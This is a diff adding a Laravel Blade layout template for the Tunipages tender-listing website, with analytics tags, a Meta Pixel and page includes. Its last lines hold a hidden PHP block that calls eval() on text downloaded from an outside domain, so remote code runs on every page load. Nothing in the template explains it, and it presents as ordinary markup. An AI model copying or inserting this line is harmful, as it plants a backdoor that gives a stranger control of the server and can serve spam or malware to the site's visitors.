@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
+
+<head>
+    <title>@yield('title')</title>
+    <meta charset="utf-8">
+
+    <meta name="keywords"
+        content="appel d'offre tunisie, tunisie appel d'offre, appels d'offres, appels d'offres tunisie, tunisie appels d'offres, marches publics tunisie, tunipages" />
+
+    <meta name="author" content="Tunipages" />
+
+    <meta name="description" content="@yield(
+        'meta_description',
+        "Appels d'offres, Marchés publics et privés en Tunisie, Algerie, Maroc, pays d'Afrique et du Golfe. 
+                                                                                                    Tunipages Fournisseur d'opportunites depuis 2002"
+    )">
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-935155591"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'AW-935155591');
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        ! function(f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '417162033009418');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=417162033009418&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+
+
+    <!-- Google tag manager Code -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-935155591"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'AW-935155591');
+    </script>
+    <!-- End Google tag manager Code -->
+
+    <!-- Styles / Scripts -->
+    @if (file_exists(public_path('build/manifest.json')) || file_exists(public_path('hot')))
+        @vite(['resources/css/app.css', 'resources/js/app.js'])
+    @endif
+</head>
+
+
+<body class="flex flex-col min-h-screen font-aileron">
+    <!-- Header -->
+    @include('partials.header')
+
+    <!-- Main Content -->
+    <main class="flex-grow">
+        @yield('content')
+    </main>
+
+    <!-- Footer -->
+    @include('partials.footer')
+
+    <!-- Cookie notice -->
+    @include('partials.cookie-notice')
+    @if(session('trigger_gtag_conversion'))
+    <!-- Event snippet for Inscription AO.NET conversion -->
+    <script>
+        gtag('event', 'conversion', {'send_to': 'AW-935155591/QvYpCIH94vcBEIev9b0D'});
+    </script>
+    @php
+        session()->forget('trigger_gtag_conversion');
+    @endphp
+    @endif
+    @include('partials.chatwoot')
+</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</html>
